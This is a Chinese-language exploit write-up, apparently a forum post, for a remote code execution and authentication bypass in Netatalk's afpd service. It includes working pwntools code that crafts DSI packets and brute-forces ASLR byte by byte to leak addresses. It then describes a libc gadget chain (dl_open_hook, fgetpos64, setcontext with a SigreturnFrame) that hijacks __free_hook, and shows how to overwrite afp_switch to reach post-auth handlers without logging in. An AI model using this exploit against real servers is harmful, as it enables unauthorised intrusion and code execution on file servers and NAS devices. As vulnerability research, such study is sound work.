
# Exploit for RCE

如图3，通过观察，我们可以得知ASLR的Randomization主要是`0x00 00 7f ?? ?? ?? ?0 00`，这样的随机化规律。那么，我们可以通过不断的写`commands`指针的地址试，逐个试探`??`，观察子进程是否crash。若`commands`指针地址不可写，那么后续读`commands`指针数据的操作将触发非法内存访问导致进程crash，无法响应我们的请求。也就是说，如果我们发的包修改的`commands`指针地址合法，我们会收到响应的数据包，如果没有那么就意味着我们写的`commands`指针地址非法。首先，`commands`指针原始的地址肯定是合法的、可写的。我们可以选择从`0x00 00 7f ?? ?? ?? ?0 00`的高字节逐字节往低试探（即上述格式的从左往右消除问号），每当我们收到响应包时，我们便确定了一个`??`，转而继续往下一个`??`试探，直至确定一个合法的可写地址。

当我们确定一个合法的地址时，有什么用呢？ELF模块之间的相对位置通常是固定的，例如`afpd`永远是第一个加载的模块。由此当我们在内存中确定一个可写内存的位置时，其相对于其他模块、地址的偏移也是相对固定的，差也不会差太多。我们可以这样来爆破，我们从高地址开始逐渐向低地址爆破，然后每一个字节爆破的值从`255`->`0`开始，那么我们拿到的地址，几乎可以肯定的说落在地址最高的ELF模块中。同理，从低字节开始往高字节写，从`0`->`255`开始，把`7f`也当作`??`试探，几乎可以肯定你会得到一个落在`afpd`模块中的可读可写地址。

由于后面我给出的Exploit是通过泄露`libc`，劫持`__free_hook`指针进行内存布局并RCE的。所以我的泄露地址思路是尽量泄露一个离`libc`近的地址，因为图5中`libc`地址足够高，因此我也选择泄露一个高地址。代码如下：

```
'''
dsi_header结构:
flags: 1 byte
command: 1 byte
request_id: 2 bytes
error_code: 4 bytes
dsi_data_len: 4 bytes
reserved: 4 bytes
dsi_data: dsi_data_len bytes
'''
def create_dsi_header(command : bytes, dsi_data):
    dsi_header = b'\x00' # flags
    dsi_header += command # command
    dsi_header += b'\x01\x00' #request_id
    dsi_header += b'\x00\x00\x00\x00' # error code
    dsi_header += p32(len(dsi_data), endian='big') # Total data length--> sizeof(payload) or sizeof(dsi_data)
    dsi_header += p32(0) # reserved
    dsi_header += dsi_data # payload or dsi_data
    return dsi_header

'''
dsi_data:
code: 1 byte
size: 1 byte
data: size bytes
'''
# dsi_data = code:1byte + size:1byte + data:size bytes
def create_dsi_data(code : bytes,  data : bytes):
    dsi_data = code # code :1 byte
    dsi_data += p8(len(data)) # size: 1 byte
    assert len(data)  < 255
    dsi_data += data # data: size bytes
    return dsi_data

def leak_address():
    leak_addr = b"" # 0x00 00 7f ?? ?? ?? 00 00 00
    flags = p32(0x11223344, endian='big')
    for _ in range(3):
        for i in range(255, -1, -1):
            data = p32(0) + p32(0) + flags[::-1] + p32(0) # 覆盖 attn_quantum, datasize, server_quantum, serverID & clientID
            data += b"\x00\x00" + leak_addr + i.to_bytes(1, byteorder='little')
            dsi_data = create_dsi_data(b'\x01', data)
            dsi_header = create_dsi_header(b'\x04', dsi_data)

            io = remote(ip, port)
            io.send(dsi_header)
            try:
                res = io.recv()
                if flags in res:
                    leak_addr += i.to_bytes(1, byteorder='little')
                    io.close()
                    break
            except:
                io.close()
    return int.from_bytes(b"\x00\x00" + leak_addr + b"\x7f\x00\x00", byteorder='little')
```

该代码泄露出来的地址，落在最高的模块中。并且出于简单考虑，在这个形式中的泄露格式`0x00 00 7f ?? ?? ?? ?0 00`，我把最后两个字节默认抹除为`0`了，也即只需要泄露三个字节，并且我们泄露出来的地址是`0x1000`对齐的。

那么我们既然泄露出了一个可读可写的地址，如果我想写`libc`中的一些数据怎么办？或者我想写`afpd`中的一些数据结构怎么办？那么自然需要泄露对应的基地址。以`libc`写为例子，我给出的代码泄露出来的地址要么是位于`ld-2.27.so`中，要么是位于其下方的`mmap`内存中，我们可以大概的估算一下我们泄露的地址与`libc`之间的距离，一大步的靠近，然后一路小跑抵达`libc`基地址。例如我这里算出来的一大步是`0x18040000~0x1880000`这个区间，我们直接一大步跨过`0x18040000`，然后以`0x1000`一小步一小步的跑向`libc`。`afpd`同理，甚至更加简单。

## 0x01 RCE

好了，现在我们解决了任意地址写的问题，那么我们来考虑如何进行RCE。泄露了`libc`以及可以任意地址写，那么常规的思路就是劫持函数指针获得控制流。注意下面的讲解一开始你可能有点困惑，但请看到这一小节的最后你再读一遍你就会明白了。由三个gadgets可以完成这个思路。具体的，先看这一段gadgets，`setcontext + 53`（图4，红框）。我们可以看见只要我们能够控制`rdi`寄存器，那么我们就能控制几乎所有的寄存器，包括`rsp`和`rip`，也就是说我们就达成了劫持控制流、控制了几乎所有寄存器。这一段gadgets其实就是在进行SROP中 signal frame的构建，此时`rdi`相对于指向就是signal frame的顶部。因此，我们可以通过`pwntools`中的`SigreturnFrame`方便的控制这段代码对寄存器的赋值，只要我们可以控制`rdi`。

![图片描述](https://bbs.kanxue.com/upload/attach/202304/921065_PR4ZFG3YVSUEJCC.png)

为了控制`rdi`，我们需要另外两个gadgets。一个是`__libc_dlopen_mode + 56`，一个是`fgetpos64+207`，分别如图5、图6所示。

![图片描述](https://bbs.kanxue.com/upload/attach/202304/921065_KHHKDRVCV965Q72.png)

![图片描述](https://bbs.kanxue.com/upload/attach/202304/921065_2GN993WTKEZAG4X.png)

```
// __libc_dlopen_mode + 56
mov rax, cs:dl_open_hook
call qword ptr [rax]
↓
// fgetpos64 + 207
mov rdi, rax
call qword ptr [rax + 20h]
↓
// setcontext + 56
mov     rsp, [rdi+0A0h]
mov     rbx, [rdi+80h]
mov     rbp, [rdi+78h]
mov     r12, [rdi+48h]
mov     r13, [rdi+50h]
mov     r14, [rdi+58h]
mov     r15, [rdi+60h]
mov     rcx, [rdi+0A8h]
push    rcx
mov     rsi, [rdi+70h]
mov     rdx, [rdi+88h]
mov     rcx, [rdi+98h]
mov     r8, [rdi+28h]
mov     r9, [rdi+30h]
mov     rdi, [rdi+68h]
xor     eax, eax
retn
```

那么我如何控制`dl_open_hook`呢？在`libc2.27`中，`_dl_open_hook`地址比`__free_hook`大约高`0x2b00`左右（不同版本编译器编译出来的`libc2.27`可能略有差别，但总体大约在`0x2b00`左右）。距离这么远，我们可以覆盖到吗？答案是，可以。（在Netatalk的代码分析小节的注3部分，我们讨论了一次性可以最多写入多大的数据）简言之，我们将`commands`指针覆盖至`__free_hook`的地址处，随后根据三条gadgets的调用链，依次往后布局内存，使得我们最终能够控制`rdi`，进而控制程序流以及几乎所有寄存器，完成RCE。

![图片描述](https://bbs.kanxue.com/upload/attach/202304/921065_B9R5D7ST749BA83.png)

## 0x02 未授权访问

未授权访问的核心是泄露`afpd`的基地址，然后获取其中的三个关键数据结构`preauth_switch`、`postauth_switch`和`afp_switch`，再通过任意地址写将`afp_switch`变量的值写成`postauth_switch`，即可进行未授权访问。

![图片描述](https://bbs.kanxue.com/upload/attach/202304/921065_UAGZPSJU35TT3SA.png)

![图9-afpd中postauth_switch的位置](https://bbs.kanxue.com/upload/attach/202304/921065_P9Q9U4EZT7NYNZA.png)
